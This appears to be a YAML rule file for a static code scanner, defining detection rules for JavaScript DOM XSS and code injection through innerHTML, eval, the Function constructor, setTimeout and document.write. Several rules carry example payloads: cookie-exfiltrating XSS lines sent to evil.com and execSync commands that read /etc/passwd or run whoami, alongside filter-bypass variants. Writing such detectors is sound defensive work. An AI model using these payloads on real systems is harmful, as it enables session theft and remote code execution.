rules:

  # ==========================================================================
  # JS-INJ-001: innerHTML/outerHTML DOM XSS Injection
  # ==========================================================================
  - rule_id: JS-INJ-001
    title: innerHTML/outerHTML DOM XSS Injection
    description: >
      Detects assignment of user-controlled input to innerHTML or outerHTML
      properties, enabling DOM-based Cross-Site Scripting. These properties
      parse HTML strings and execute embedded scripts, allowing attackers to
      inject malicious markup that executes in the victim's browser context.
    language: javascript
    category: injection
    severity: High
    confidence: 0.93
    cwe: CWE-79
    owasp: "A03:2021-Injection"
    tags:
      - xss
      - dom-xss
      - innerHTML
      - outerHTML
      - client-side
    detection_layer: 2
    attack_surface_type: "web"
    patterns:
      - type: regex
        pattern: '\.innerHTML\s*=\s*(?![\x27"`]\s*$)[^;]*(?:req\.|request\.|params\.|query\.|body\.|input|user|data|value|response)'
        description: "innerHTML assigned from user-controlled variable"
      - type: regex
        pattern: '\.outerHTML\s*=\s*[^;]*(?:req\.|request\.|params\.|query\.|body\.|input|user)'
        description: "outerHTML assigned from user-controlled variable"
      - type: regex
        pattern: '\.innerHTML\s*(?:\+|=)\s*[`][^`]*\$\{[^}]*(?:req|request|params|query|body|input|user)[^}]*\}'
        description: "innerHTML with template literal containing user input"
      - type: regex
        pattern: '\.innerHTML\s*=\s*[^;]*\.(?:value|textContent|innerText|getAttribute\s*\()'
        description: "innerHTML from DOM element value"
      - type: regex
        pattern: 'document\.getElementById\s*\([^)]+\)\s*\.innerHTML\s*='
        description: "Direct element innerHTML assignment"
      - type: regex
        pattern: '\.insertAdjacentHTML\s*\(\s*[\x27"][^)]+[\x27"]\s*,\s*[^)]*(?:req|input|user|data|value)'
        description: "insertAdjacentHTML with user-controlled content"
    anti_patterns:
      - 'DOMPurify\.sanitize\s*\('
      - 'sanitize\s*\('
      - 'escapeHtml\s*\('
      - 'textContent\s*='
      - 'innerText\s*='
      - '\.innerHTML\s*=\s*[\x27"][\x27"]\s*;'
      - '\.innerHTML\s*=\s*[\x27"][^${}]*[\x27"]\s*;'
      - 'createTextNode\s*\('
      - 'xss\s*\('
      - 'encode\s*\('
    bypass_variants:
      - description: "SVG onload event bypass"
        pattern: '<svg\s+onload\s*='
      - description: "IMG onerror bypass"
        pattern: '<img\s+src\s*=\s*x\s+onerror\s*='
      - description: "Template injection via backtick"
        pattern: '`[^`]*\$\{[^}]*\}[^`]*`'
    evasion_indicators:
      - "HTML entity encoding to bypass filters"
      - "JavaScript event handlers in injected HTML"
      - "SVG/MathML namespace confusion"
      - "DOM clobbering via injected elements"
    encoding_variants:
      - type: "html_entities"
        pattern: '&(?:#x[0-9a-fA-F]+|#\d+|[a-zA-Z]+);'
      - type: "unicode_escape"
        pattern: '\\u[0-9a-fA-F]{4}'
    multi_function_chain_patterns:
      - "fetch(url) -> response.text() -> element.innerHTML = text"
      - "req.query.input -> template literal -> element.innerHTML"
      - "location.hash -> decode -> innerHTML assignment"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "DOM XSS enables session hijacking, credential theft, and account takeover"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "req.query, req.body, URL parameters"
        sink: "element.innerHTML"
        through: "direct assignment or template literal"
      - source: "location.hash, location.search"
        sink: "element.innerHTML"
        through: "URL fragment decoding"
    impact: |
      DOM XSS via innerHTML allows attackers to execute arbitrary JavaScript
      in the victim's browser, enabling session hijacking, credential theft,
      keylogging, phishing overlays, and cryptocurrency mining.
    remediation: |
      - Use textContent or innerText instead of innerHTML for text.
      - Sanitize HTML with DOMPurify before innerHTML assignment.
      - Use Content Security Policy headers to mitigate impact.
      - Use frameworks with automatic escaping (React, Vue, Angular).
    references:
      - "https://cwe.mitre.org/data/definitions/79.html"
      - "https://owasp.org/www-community/attacks/DOM_Based_XSS"
    context_awareness:
      surrounding_context_patterns:
        - 'document\.'
        - 'getElementById'
        - 'querySelector'
        - 'addEventListener'
      taint_source_indicators:
        - 'req\.query'
        - 'req\.body'
        - 'location\.hash'
        - 'location\.search'
        - 'window\.name'
        - 'document\.referrer'
      taint_sink_indicators:
        - '\.innerHTML'
        - '\.outerHTML'
        - 'insertAdjacentHTML'
        - 'document\.write'
      sanitization_patterns:
        - 'DOMPurify\.sanitize'
        - 'escapeHtml'
        - 'sanitizeHtml'
        - 'textContent'
    severity_scoring:
      severity_weight: 8
      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A search page displays results by setting innerHTML from the query
        parameter: element.innerHTML = req.query.q. An attacker sends a URL
        with q=<img src=x onerror=alert(document.cookie)> to steal cookies.
      example_payload: "<img src=x onerror='fetch(`https://evil.com/steal?c=`+document.cookie)'>"
      attacker_objective: "Execute arbitrary JavaScript in victim's browser via DOM XSS"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules:
        - JS-INJ-002
        - JS-INJ-005

  # ==========================================================================
  # JS-INJ-002: eval() with User Input
  # ==========================================================================
  - rule_id: JS-INJ-002
    title: eval() with User-Controlled Input
    description: >
      Detects usage of JavaScript eval() function where the argument may contain
      user-controlled input. eval() interprets strings as JavaScript code, enabling
      arbitrary code execution when untrusted data is passed to it.
    language: javascript
    category: injection
    severity: Critical
    confidence: 0.95
    cwe: CWE-95
    owasp: "A03:2021-Injection"
    tags:
      - code-injection
      - eval
      - rce
      - javascript
    detection_layer: 1
    attack_surface_type: "web"
    patterns:
      - type: regex
        pattern: 'eval\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.|input|user|data)'
        description: "eval() with request/user input directly"
      - type: regex
        pattern: 'eval\s*\(\s*[`][^`]*\$\{[^}]*(?:req|request|params|query|body|input|user)[^}]*\}'
        description: "eval() with template literal containing user input"
      - type: regex
        pattern: 'eval\s*\(\s*[\x27"][^)]*[\x27"]\s*\+\s*(?:req|request|params|query|body|input|user)'
        description: "eval() with string concatenation of user input"
      - type: regex
        pattern: 'eval\s*\(\s*(?:JSON\.stringify|decodeURIComponent|atob)\s*\([^)]*(?:req|input|user|data)'
        description: "eval() with decoded/stringified user input"
      - type: regex
        pattern: 'eval\s*\(\s*(?:args|argv|options|config|payload|expression|formula|code)\s*[,\)]'
        description: "eval() with common variable names for dynamic input"
    anti_patterns:
      - 'eval\s*\(\s*[\x27"][^${}]+[\x27"]\s*\)'
      - '// eslint-disable.*no-eval'
      - 'JSON\.parse\s*\('
      - '// safe: constant'
      - 'eval\s*\(\s*JSON\.stringify\s*\(\s*\{[\x27"][a-zA-Z]+[\x27"]'
      - '// nosec'
      - 'vm\.runInNewContext'
      - 'test\s*\('
      - 'describe\s*\('
    bypass_variants:
      - description: "Indirect eval via window"
        pattern: 'window\s*\[\s*[\x27"]eval[\x27"]\s*\]\s*\('
      - description: "Eval via Function constructor"
        pattern: 'new\s+Function\s*\(\s*(?:req|input|user|data)'
      - description: "Eval alias"
        pattern: '(?:var|let|const)\s+\w+\s*=\s*eval\s*;'
    evasion_indicators:
      - "Indirect eval via variable alias"
      - "window['eval'] property access"
      - "eval through computed property name"
    encoding_variants:
      - type: "base64_decode"
        pattern: 'eval\s*\(\s*atob\s*\('
      - type: "hex_decode"
        pattern: 'eval\s*\(\s*[^)]*\\x[0-9a-fA-F]{2}'
    multi_function_chain_patterns:
      - "req.body.expression -> eval(expression)"
      - "req.query.formula -> decodeURIComponent -> eval"
      - "WebSocket message -> JSON.parse -> eval(msg.code)"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Arbitrary JavaScript code execution on server or client"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "req.body.expression"
        sink: "eval()"
        through: "direct parameter passing"
      - source: "req.query.code"
        sink: "eval()"
        through: "query string extraction"
    impact: |
      Arbitrary JavaScript code execution enabling RCE on Node.js servers,
      data exfiltration, credential theft, and full system compromise. On
      client-side, enables complete session takeover.
    remediation: |
      - Never use eval() with user input. Use JSON.parse() for JSON.
      - Use safe expression evaluators (mathjs, expr-eval).
      - Implement Content Security Policy with script-src restrictions.
      - Use vm2 or isolated-vm for sandboxed code execution.
    references:
      - "https://cwe.mitre.org/data/definitions/95.html"
      - "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval"
    context_awareness:
      surrounding_context_patterns:
        - 'require\s*\('
        - 'module\.exports'
        - 'app\.\w+\s*\('
        - 'router\.\w+\s*\('
      taint_source_indicators:
        - 'req\.body'
        - 'req\.query'
        - 'req\.params'
        - 'process\.argv'
      taint_sink_indicators:
        - 'eval\s*\('
        - 'Function\s*\('
        - 'vm\.runInThisContext'
      sanitization_patterns:
        - 'JSON\.parse'
        - 'parseInt'
        - 'parseFloat'
        - 'allowlist'
    severity_scoring:
      severity_weight: 10
      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A calculator API evaluates user expressions via eval(req.body.expr).
        Attacker sends expr=require('child_process').execSync('cat /etc/passwd')
        to execute OS commands on the server.
      example_payload: "require('child_process').execSync('id').toString()"
      attacker_objective: "Achieve remote code execution via eval injection"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules:
        - JS-INJ-003
        - JS-INJ-004

  # ==========================================================================
  # JS-INJ-003: Function Constructor Injection
  # ==========================================================================
  - rule_id: JS-INJ-003
    title: Function Constructor Injection
    description: >
      Detects use of the Function constructor with user-controlled strings.
      new Function(code) is equivalent to eval() and executes arbitrary
      JavaScript. Attackers can inject code through function body arguments.
    language: javascript
    category: injection
    severity: Critical
    confidence: 0.94
    cwe: CWE-95
    owasp: "A03:2021-Injection"
    tags: [code-injection, function-constructor, rce, javascript]
    detection_layer: 1
    attack_surface_type: "web"
    patterns:
      - type: regex
        pattern: 'new\s+Function\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.|input|user|data|code|expr)'
        description: "Function constructor with user-controlled argument"
      - type: regex
        pattern: 'new\s+Function\s*\(\s*[`][^`]*\$\{[^}]*(?:req|input|user|data)[^}]*\}'
        description: "Function constructor with template literal user input"
      - type: regex
        pattern: 'new\s+Function\s*\(\s*[\x27"][^)]*[\x27"]\s*\+\s*(?:req|input|user|data)'
        description: "Function constructor with concatenated user input"
      - type: regex
        pattern: 'Function\s*\(\s*(?:\.\.\.args|arguments|code|body|script)\s*\)'
        description: "Function constructor with dynamic arguments"
    anti_patterns:
      - 'new\s+Function\s*\(\s*[\x27"][^${}]+[\x27"]\s*\)'
      - '// safe: constant'
      - 'test\s*\('
      - 'describe\s*\('
      - '// eslint-disable'
      - 'Function\.prototype'
    bypass_variants:
      - description: "Indirect Function via constructor property"
        pattern: '(?:\[\]|{})\.constructor\.constructor\s*\('
      - description: "Function via generator"
        pattern: 'function\s*\*\s*\(\s*\)\s*\{\s*\}\.constructor\s*\('
    evasion_indicators:
      - "Indirect Function access via constructor chain"
      - "Generator function constructor bypass"
    encoding_variants:
      - type: "base64_decode"
        pattern: 'new\s+Function\s*\(\s*atob\s*\('
      - type: "unicode"
        pattern: 'new\s+Function\s*\(\s*[^)]*\\u[0-9a-fA-F]{4}'
    multi_function_chain_patterns:
      - "req.body.code -> new Function(code) -> fn()"
      - "WebSocket data -> Function(data) -> execute"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Arbitrary code execution equivalent to eval()"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "req.body.code"
        sink: "new Function(code)"
        through: "direct parameter passing"
    impact: |
      Function constructor injection enables arbitrary JavaScript execution,
      identical to eval() in impact. On Node.js, this leads to full RCE.
    remediation: |
      - Never pass user input to new Function().
      - Use safe expression parsers (mathjs, expr-eval).
      - Apply CSP headers to restrict inline script execution.
    references:
      - "https://cwe.mitre.org/data/definitions/95.html"
    context_awareness:
      surrounding_context_patterns: ['require\s*\(', 'module\.exports', 'app\.']
      taint_source_indicators: ['req\.body', 'req\.query', 'req\.params']
      taint_sink_indicators: ['new\s+Function', 'Function\s*\(']
      sanitization_patterns: ['JSON\.parse', 'allowlist', 'validate']
    severity_scoring:
      severity_weight: 10
      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A template engine uses new Function('data', userTemplate) to compile
        templates. Attacker provides template containing process.exit() or
        require('child_process').exec('rm -rf /').
      example_payload: "return require('child_process').execSync('whoami').toString()"
      attacker_objective: "Execute arbitrary code via Function constructor"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules: [JS-INJ-002, JS-INJ-004]

  # ==========================================================================
  # JS-INJ-004: setTimeout/setInterval String Injection
  # ==========================================================================
  - rule_id: JS-INJ-004
    title: setTimeout/setInterval String Argument Injection
    description: >
      Detects setTimeout or setInterval called with a string argument containing
      user input. When passed a string, these functions evaluate it as code,
      equivalent to eval().
    language: javascript
    category: injection
    severity: High
    confidence: 0.91
    cwe: CWE-95
    owasp: "A03:2021-Injection"
    tags: [code-injection, setTimeout, setInterval, javascript]
    detection_layer: 2
    attack_surface_type: "web"
    patterns:
      - type: regex
        pattern: 'setTimeout\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.|input|user|data)'
        description: "setTimeout with user-controlled string"
      - type: regex
        pattern: 'setInterval\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.|input|user|data)'
        description: "setInterval with user-controlled string"
      - type: regex
        pattern: 'setTimeout\s*\(\s*[`][^`]*\$\{[^}]*(?:req|input|user)[^}]*\}'
        description: "setTimeout with template literal user input"
      - type: regex
        pattern: 'setTimeout\s*\(\s*[\x27"][^)]*[\x27"]\s*\+\s*(?:req|input|user)'
        description: "setTimeout with concatenated user input"
    anti_patterns:
      - 'setTimeout\s*\(\s*(?:function|\(\)|=>)'
      - 'setTimeout\s*\(\s*\w+\s*,\s*\d+\s*\)'
      - 'setInterval\s*\(\s*(?:function|\(\)|=>)'
      - 'setTimeout\s*\(\s*[\x27"][^${}]+[\x27"]\s*,'
      - 'test\s*\('
      - '// safe'
    bypass_variants:
      - description: "setTimeout via window property"
        pattern: 'window\s*\[\s*[\x27"]setTimeout[\x27"]\s*\]'
      - description: "Encoded string to setTimeout"
        pattern: 'setTimeout\s*\(\s*atob\s*\('
    evasion_indicators:
      - "String argument to timer functions"
      - "Indirect access via window property"
    encoding_variants:
      - type: "base64"
        pattern: 'setTimeout\s*\(\s*atob\s*\('
      - type: "url_encoding"
        pattern: 'setTimeout\s*\(\s*decodeURIComponent\s*\('
    multi_function_chain_patterns:
      - "req.query.callback -> setTimeout(callback, 0)"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Code execution via timer function string evaluation"
    business_logic_indicator:
      financial_impact: false
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "req.query.callback"
        sink: "setTimeout(callback)"
        through: "direct string pass"
    impact: |
      Arbitrary JavaScript execution via timer functions when string arguments
      are used instead of function references. Enables XSS and session hijacking.
    remediation: |
      - Always pass function references to setTimeout/setInterval, never strings.
      - Use arrow functions: setTimeout(() => action(), delay).
      - Enable ESLint no-implied-eval rule.
    references:
      - "https://cwe.mitre.org/data/definitions/95.html"
    context_awareness:
      surrounding_context_patterns: ['document\.', 'window\.']
      taint_source_indicators: ['req\.query', 'location\.', 'window\.name']
      taint_sink_indicators: ['setTimeout\s*\(', 'setInterval\s*\(']
      sanitization_patterns: ['typeof.*function', 'allowlist']
    severity_scoring:
      severity_weight: 8
      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A notification system uses setTimeout(req.query.action, 1000) to
        schedule callbacks. Attacker sets action=alert(document.cookie).
      example_payload: "fetch('https://evil.com/'+document.cookie)"
      attacker_objective: "Execute JavaScript via timer string evaluation"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules: [JS-INJ-002, JS-INJ-003]

  # ==========================================================================
  # JS-INJ-005: document.write Injection
  # ==========================================================================
  - rule_id: JS-INJ-005
    title: document.write DOM Injection
    description: >
      Detects document.write() or document.writeln() with user-controlled input.
      These functions directly inject HTML into the page, enabling DOM XSS when
      unsanitized user data is included.
    language: javascript
    category: injection
    severity: High
    confidence: 0.92
    cwe: CWE-79
    owasp: "A03:2021-Injection"
    tags: [xss, dom-xss, document-write, javascript]
    detection_layer: 2
    attack_surface_type: "web"
    patterns:
      - type: regex
        pattern: 'document\.write(?:ln)?\s*\(\s*[^)]*(?:req\.|request\.|params\.|query\.|body\.|input|user|data|value)'
        description: "document.write with user-controlled variable"
      - type: regex
        pattern: 'document\.write(?:ln)?\s*\(\s*[`][^`]*\$\{[^}]*(?:req|input|user|location|document\.referrer)[^}]*\}'
        description: "document.write with template literal user input"
      - type: regex
        pattern: 'document\.write(?:ln)?\s*\(\s*[\x27"][^)]*[\x27"]\s*\+\s*(?:location|document\.referrer|window\.name)'
        description: "document.write with DOM-based taint sources"
      - type: regex
        pattern: 'document\.write(?:ln)?\s*\(\s*(?:decodeURIComponent|unescape)\s*\('
        description: "document.write with URL-decoded content"
    anti_patterns:
      - 'document\.write\s*\(\s*[\x27"][^${}]+[\x27"]\s*\)'
      - 'DOMPurify\.sanitize'
      - 'escapeHtml'
      - '// safe: static'
      - 'document\.write\s*\(\s*[\x27"]<script'
      - 'test\s*\('
    bypass_variants:
      - description: "document.write via document['write']"
        pattern: 'document\s*\[\s*[\x27"]write[\x27"]\s*\]\s*\('
      - description: "Write after DOM load"
        pattern: 'document\.open\s*\(\s*\)[^;]*document\.write'
    evasion_indicators:
      - "Indirect document.write via bracket notation"
      - "document.open before write to replace entire page"
    encoding_variants:
      - type: "url_encoding"
        pattern: 'document\.write\s*\(\s*decodeURIComponent'
      - type: "html_entities"
        pattern: 'document\.write\s*\(\s*[^)]*&#'
    multi_function_chain_patterns:
      - "location.search -> decodeURIComponent -> document.write"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "DOM XSS via document.write enables script injection"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "location.search, location.hash"
        sink: "document.write()"
        through: "URL parameter extraction"
    impact: |
      document.write with user input enables DOM-based XSS, allowing attackers
      to inject scripts, steal credentials, and hijack sessions.
    remediation: |
      - Avoid document.write(); use DOM manipulation APIs instead.
      - Sanitize content with DOMPurify before writing.
      - Use textContent for text-only output.
    references:
      - "https://cwe.mitre.org/data/definitions/79.html"
    context_awareness:
      surrounding_context_patterns: ['document\.', '<script']
      taint_source_indicators: ['location\.search', 'location\.hash', 'document\.referrer']
      taint_sink_indicators: ['document\.write', 'document\.writeln']
      sanitization_patterns: ['DOMPurify\.sanitize', 'escapeHtml', 'textContent']
    severity_scoring:
      severity_weight: 8
      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A page uses document.write(decodeURIComponent(location.search)) to
        render search terms. Attacker crafts URL with ?<script>alert(1)</script>.
      example_payload: "<script>document.location='https://evil.com/?c='+document.cookie</script>"
      attacker_objective: "Inject HTML/JavaScript via document.write"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
